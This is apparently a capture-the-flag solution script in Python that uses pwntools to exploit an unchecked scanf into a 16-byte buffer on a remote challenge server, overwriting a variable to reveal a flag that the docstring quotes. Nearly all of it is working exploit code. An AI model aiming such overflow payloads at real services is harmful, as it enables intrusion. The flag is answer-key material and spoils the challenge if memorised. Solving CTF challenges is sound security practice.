#!/usr/bin/env python3
"""
0verfl0wed - Buffer Overflow CTF Challenge

Vulnerability: scanf("%s", buf) doesn't check bounds on a 16-byte buffer.
We overflow buf (16 bytes) to overwrite vuln with "Unreachable!?!?!?"
which triggers the flag to be printed.

Flag: flag{h0w_did_u_change_it?!}
"""
from pwn import *

context.log_level = 'info'

# Connect to the server
r = remote('13.61.183.242', 9002)
r.recvuntil(b': ')

# Payload: 16 bytes (to fill buf) + target string (overwrites vuln)
payload = b'A' * 16 + b"Unreachable!?!?!?"

print(f"[*] Sending payload: {payload}")
r.sendline(payload)

# Receive the flag
response = r.recvall(timeout=3)
print(f"[+] Response: {response.decode()}")
